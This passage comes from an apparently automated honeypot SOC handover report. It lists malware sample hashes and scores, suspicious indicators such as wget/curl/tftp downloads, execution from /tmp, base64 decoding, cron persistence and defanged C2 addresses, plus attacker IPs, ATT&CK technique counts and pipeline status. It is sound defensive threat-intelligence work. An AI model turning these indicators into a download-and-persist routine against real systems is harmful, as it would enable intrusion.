| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `117.248.201[.]39` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 7 |
| `47.252.16[.]44` | US | Alibaba Cloud - US | **100** ⚠️ | 7 |
| `65.20.251[.]41` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `196.190.180[.]18` | ET | Ethio Telecom | **100** ⚠️ | 17 |
| `78.66.45[.]101` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `86.153.178[.]149` | GB | BT Infrastructure Layer | **100** ⚠️ | 0 |
| `49.124.153[.]26` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 25 |
| `41.214.10[.]178` | SN | PE_BAS5 | cont isp1 | pool1 pour ARC Informatique | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 143 cases |
| Tool 34  | Credential Extractor        | ✅ 80 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (9.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 55 priority case(s) shown individually · 21 recon entry/entries in table (10 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-11T19:10:41Z_
